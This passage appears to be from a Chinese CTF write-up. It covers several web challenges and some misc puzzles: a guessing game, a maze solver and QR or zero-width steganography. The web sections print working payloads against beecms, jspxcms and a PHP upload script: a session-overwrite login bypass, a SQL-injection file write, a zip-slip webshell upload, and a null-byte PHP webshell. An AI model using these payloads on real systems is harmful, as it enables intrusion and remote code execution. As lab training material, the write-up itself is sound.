class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [11&#x2F;Jul&#x2F;2020:00:00:00 +0000] &quot;GET &#x2F;this_is_final_flag_e2a457126032b42d.php HTTP&#x2F;1.1&quot; 200 5 &quot;-&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko&#x2F;20100101 Firefox&#x2F;89.0&quot;</span><br></pre></td></tr></table></figure><p>此时可以尝试包含 <code>this_is_final_flag_e2a457126032b42d.php</code> 来获取 flag，但此处 flag 位于正则的黑名单内，需要使用一个 Unicode 字符来绕过。构造出 <code>this_is_final_f%falag_e2a457126032b42d.php</code> 即可绕过此处的黑名单而正常包含到文件，得到如下信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;2176d788-e2ed-4818-96ea-76ab24a64260&#125;&#x27;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2176d788-e2ed-4818-96ea-76ab24a64260&#125;</span><br></pre></td></tr></table></figure><h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><p>很明显靶机是 beecms，尝试寻找已存在的漏洞。使用如下载荷可以快速获得 admin 权限。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mx_form/mx_form.php?id=12</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>96</span><br><span class="line"></span><br><span class="line">_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=100000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>进入后台后发现文件上传处没有写权限，因此无法写入 shell 进行 RCE。此时回到登录界面，发现其中存在 SQL 注入，尝试一把梭写入 PHPINFO。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/login.php?action=ck_login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>208</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://ddd436ed-9ebd-4e1d-b809-965543df5fff.node4.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">user=admin&#x27;/**/union/**/selselectect/**/0x3c3f70687020706870696e666f28293b203f3e,1,1,1,1/**/into/**/outfoutfileile/**/&#x27;/var/www/html/phpinfo.php&#x27;/**/%23&amp;password=hex&amp;code=&amp;submit=true&amp;submit.x=27&amp;submit.y=31</span><br></pre></td></tr></table></figure><p>发现可以成功访问到 PHPINFO，且没有 disable_functions，于是写 shell 进行 RCE，得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;72723792-5469-43b9-b6c0-0d03b51b0193&#125;</span><br></pre></td></tr></table></figure><h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><p>admin 和空密码登录到后台，发现有文件上传。使用冰蝎的 shell.jsp 构建 war 包，然后使用如下载荷构建恶意 zip 包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">war = <span class="built_in">open</span>(<span class="string">&#x27;zfsn.war&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">zipFile = zipfile.ZipFile(<span class="string">&quot;zfsn.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">info = zipfile.ZipInfo(<span class="string">&quot;zfsn.zip&quot;</span>)</span><br><span class="line">zipFile.writestr(<span class="string">&quot;../../../zfsn.war&quot;</span>, war)</span><br><span class="line">zipFile.close()</span><br></pre></td></tr></table></figure><p>将压缩文档以上传文件的方式上传到靶机，并点击解压，即可在 <code>.../zfsn/shell.jsp</code> 获得 shell。使用冰蝎连接即可得到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628063348856028/4fbd617592a2f64ebc53dc64e3ad154662f1ae0c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a72908e2-c6c3-455c-a129-17208d595884&#125;</span><br></pre></td></tr></table></figure><h3 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h3><blockquote><p>网上能搜到源码，仅修改了前端ui，注意服务器的响应</p></blockquote><p>在网上可以找到关键部分 qdl.php 的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$base64_img</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;img&#x27;</span>]);</span><br><span class="line"><span class="variable">$id</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$url</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$up_dir</span> = <span class="string">&#x27;./img/&#x27;</span>;<span class="comment">//存放在当前目录的img文件夹下</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>) || <span class="keyword">empty</span>(<span class="variable">$url</span>) || <span class="keyword">empty</span>(<span class="variable">$base64_img</span>))&#123; </span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$up_dir</span>))&#123;</span><br><span class="line">  mkdir(<span class="variable">$up_dir</span>,<span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="variable">$base64_img</span>, <span class="variable">$result</span>))&#123;</span><br><span class="line">  <span class="variable">$type</span> = <span class="variable">$result</span>[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span>(in_array(<span class="variable">$type</span>,<span class="keyword">array</span>(<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">    <span class="variable">$new_file</span> = <span class="variable">$up_dir</span>.<span class="variable">$id</span>.<span class="string">&#x27;_&#x27;</span>.date(<span class="string">&#x27;mdHis_&#x27;</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$type</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$new_file</span>, base64_decode(str_replace(<span class="variable">$result</span>[<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$base64_img</span>)));</span><br><span class="line">    header(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现其中存在文件的写入，拦截请求尝试构建载荷写入 shell，但是此处的文件名只有 <code>id</code> 是可控的位置。查看请求的 <code>X-Powered-By</code> 可知后端使用的是 PHP 5.2.17，而这个版本存在 <code>%00</code> 截断，因此可以使用如下的载荷写入 shell。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/qbl.php?id=shell.php%00.png&amp;url=http://baidu.com</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:25651</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>76</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">img=data%3Aimage%2Fpng%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUWyJoZXgiXSk7ID8%2b</span><br></pre></td></tr></table></figure><p>利用 shell 即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7bdd5754-549e-46ac-b2c4-17d86543ee8e&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p></blockquote><p>有时间限制的猜测小游戏，需要连续猜对 66 次，一次 nc 连接的 66 个结果是固定的。因此只需要一边不断猜测一边记录结果，输了就按照结果重新猜测，即可最终到达 66 次。写出如下脚本来获取 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29400</span>)</span><br><span class="line">proc.recvuntil(<span class="string">&quot;To get the flag if you predict the results of all games successfully!&quot;</span>)</span><br><span class="line">answers = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = proc.recvuntil(<span class="string">&quot;choose one [r] Red Team,[b] Blue Team:&quot;</span>)</span><br><span class="line">    position = response.index(<span class="string">b&quot;Game&quot;</span>)</span><br><span class="line">    <span class="built_in">round</span>: <span class="built_in">int</span> = <span class="built_in">int</span>(response[position + <span class="number">5</span>:position + <span class="number">8</span>].split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] length of answer <span class="subst">&#123;<span class="built_in">len</span>(answers)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(answers) &lt; <span class="built_in">round</span>:</span><br><span class="line">        decision = <span class="string">&quot;b&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decision = answers[<span class="built_in">round</span> - <span class="number">1</span>]</span><br><span class="line">    proc.sendline(decision)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;<span class="built_in">round</span>&#125;</span> round decision <span class="subst">&#123;decision&#125;</span>&quot;</span>)</span><br><span class="line">    response = proc.recvregex(<span class="string">r&quot;(.*?)The result \w&#123;3,4&#125; Team&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (decision == <span class="string">&quot;b&quot;</span> <span class="keyword">and</span> <span class="string">b&quot;The result Blue Team&quot;</span> <span class="keyword">in</span> response) <span class="keyword">or</span> (</span><br><span class="line">            decision == <span class="string">&quot;r&quot;</span> <span class="keyword">and</span> <span class="string">b&quot;The result Red Team&quot;</span> <span class="keyword">in</span> response):</span><br><span class="line">        answers[<span class="built_in">round</span> - <span class="number">1</span>] = decision</span><br><span class="line">        proc.recvregex(<span class="string">r&quot;The number of successful predictions \d&#123;1,2&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">66</span>:</span><br><span class="line">            proc.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(proc.recvuntil(<span class="string">&quot;\n&quot;</span>).decode().strip())</span><br><span class="line">            proc.close()</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answers[<span class="built_in">round</span> - <span class="number">1</span>] = (<span class="string">&quot;r&quot;</span> <span class="keyword">if</span> decision == <span class="string">&quot;b&quot;</span> <span class="keyword">else</span> <span class="string">&quot;b&quot;</span>)</span><br><span class="line">        proc.sendafter(<span class="string">&quot;Play again? (y/n):&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4bb39602-5ad7-4110-a685-b1efbf555268&#125;</span><br></pre></td></tr></table></figure><h3 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h3><blockquote><p>七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？</p></blockquote><p>对所给出的迷宫使用 DFS 计算最短可行路径，写出如下脚本来获取 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">MIN = <span class="number">2147483647</span></span><br><span class="line">mazeMaxArray = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line">signPoints = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">startX, startY, endX, endY, maze, stepCount</span>):</span></span><br><span class="line">    nextSteps = [[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [-<span class="number">1</span>, <span class="number">0</span>]]  <span class="comment"># right, down, left, up</span></span><br><span class="line">    <span class="keyword">if</span> startX == endX <span class="keyword">and</span> startY == endY:</span><br><span class="line">        <span class="keyword">global</span> MIN</span><br><span class="line">        <span class="keyword">if</span> stepCount &lt; MIN:</span><br><span class="line">            MIN = stepCount</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> nextStep <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nextSteps)):</span><br><span class="line">        nextX = startX + nextSteps[nextStep][<span class="number">0</span>]</span><br><span class="line">        nextY = startY + nextSteps[nextStep][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nextX &lt; <span class="number">0</span> <span class="keyword">or</span> nextY &lt; <span class="number">0</span> <span class="keyword">or</span> nextX &gt; <span class="built_in">len</span>(maze) <span class="keyword">or</span> nextY &gt; <span class="built_in">len</span>(maze[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> mazeMaxArray[nextX][nextY] == <span class="number">0</span> <span class="keyword">and</span> signPoints[nextX][nextY] == <span class="number">0</span>:</span><br><span class="line">            signPoints[nextX][nextY] = <span class="number">1</span></span><br><span class="line">            dfs(nextX, nextY, endX, endY, maze, stepCount + <span class="number">1</span>)</span><br><span class="line">            signPoints[nextX][nextY] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proc = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28565</span>)</span><br><span class="line">proc.sendlineafter(<span class="string">&quot;3.Introduction to this game\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    maze = proc.recvuntil(<span class="string">&quot;Please enter your answer:&quot;</span>).decode().replace(<span class="string">&quot;Please enter your answer:&quot;</span>, <span class="string">&quot;&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    maze = maze.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    startY = <span class="number">0</span></span><br><span class="line">    startX = <span class="number">0</span></span><br><span class="line">    endY = <span class="number">0</span></span><br><span class="line">    endX = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze)):</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze[line])):</span><br><span class="line">            <span class="keyword">if</span> maze[line][character] == <span class="string">&quot;S&quot;</span>:</span><br><span class="line">                startX, startY = line, character</span><br><span class="line">            <span class="keyword">if</span> maze[line][character] == <span class="string">&quot;E&quot;</span>:</span><br><span class="line">                endX, endY = line, character</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> maze[:]:</span><br><span class="line">        line = line.translate(<span class="built_in">str</span>.maketrans(<span class="string">&quot;SE&quot;</span>, <span class="string">&quot;  &quot;</span>))</span><br><span class="line">    mazeArray = [[<span class="number">1</span> <span class="keyword">if</span> character == <span class="string">&quot;#&quot;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> character <span class="keyword">in</span> line] <span class="keyword">for</span> line <span class="keyword">in</span> maze]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mazeArray)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mazeArray[<span class="number">0</span>])):</span><br><span class="line">            mazeMaxArray[i][j] = mazeArray[i][j]</span><br><span class="line">    signPoints[startX][startY] = <span class="number">1</span></span><br><span class="line">    dfs(startX, startY, endX, endY, mazeArray, <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(MIN + <span class="number">1</span>)</span><br><span class="line">    proc.sendline(<span class="built_in">str</span>(MIN + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">3</span>:</span><br><span class="line">        proc.recvline()</span><br><span class="line">        proc.recvline()</span><br><span class="line">        <span class="built_in">print</span>(proc.recvline().decode().strip())</span><br><span class="line">        <span class="built_in">print</span>(proc.recvline().decode().strip())</span><br><span class="line">        <span class="built_in">print</span>(proc.recvline().decode().strip())</span><br><span class="line">        proc.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    response = proc.recvuntil(<span class="string">&quot;So, Let&#x27;s move on to the next level!\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.decode().strip())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reinitiate the map</span></span><br><span class="line">    MIN = <span class="number">2147483647</span></span><br><span class="line">    mazeMaxArray = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line">    signPoints = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a6fac77f-4695-4284-abd1-d38839fbca41&#125;</span><br></pre></td></tr></table></figure><h3 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h3><blockquote><p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p></blockquote><p>解压附件后可以得到如下图片。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628041914070540/0a0131de6eb133ca61a03eacff8395334530eb6d.png@100w"></p><p>观察其颜色可以发现大多数色块都只用了 R/G/B 其中一种颜色。因此写出如下脚本尝试将其中的值取出，发现一堆字符的出现频度有差别，进而进行词频统计。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;./Nuclear wastewater.png&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>, width - <span class="number">10</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>, height - <span class="number">10</span>, <span class="number">10</span>):</span><br><span class="line">        r, g, b = image.getpixel((x, y))</span><br><span class="line">        datum = r + g + b</span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt; datum &lt; <span class="number">127</span>:</span><br><span class="line">            data.append(<span class="built_in">chr</span>(datum))</span><br><span class="line"></span><br><span class="line">wordFrequency = collections.Counter(data)</span><br><span class="line"><span class="keyword">for</span> word, frequency <span class="keyword">in</span> wordFrequency.most_common():</span><br><span class="line">    <span class="keyword">if</span> frequency == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(word, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下关键信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theKEYis:#R@&#x2F;&amp;p~!</span><br></pre></td></tr></table></figure><p>使用此  key 解压附件中的压缩文档可得如下字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‌‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‍‍‍‎‌‌‌‌‌‌‌‌‍‎‎‍‌‍‍‌‌‌‍‍‎‎‌‌‌‌‌‌‌‌‍‎‍‍‌‌‌‌‌‌‌‍‎‎‌‌‍‌‎‎‎‍‌‌‍‌‍‌‌‎‎‍‎‌‌‎‌‌‍‍‌‌‍‎‍‌‍‍‌‍‌‎‌‌‎‌‌‍‍‌‍‍‌‍‎‎‎‎‎‍‌‍‌‍‌‍‎‍‍‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‌‎‎‌‌‌‌‌‌‍‍‌‎‌‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‌‎‍‌‎‌‌‍‌‍‍‍‎‍‎‍‎‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‎‍‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‌‌‍‌‌‌‍‌‍‎‍‌‌‍‎‎OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI‌‍‌‌‌‍‍‌‎‌‍‌‍‌‌‌‍‌‎‎‎‍‌‍‎‎‌‌‍‎‍‌‎</span><br></pre></td></tr></table></figure><p>很明显存在零宽字符隐写，使用如下三种字符解码可得提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U+200C ZERO WIDTH NON-JOINER</span><br><span class="line">U+200D ZERO WIDTH JOINER</span><br><span class="line">U+200E LEFT-TO-RIGHT MARK</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021年4月13日，核废水在Citrix县的CTX1市尤为严重</span><br></pre></td></tr></table></figure><p>按照提示对去除隐写的字符串进行两次 Citrix CTX1 Decode 可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 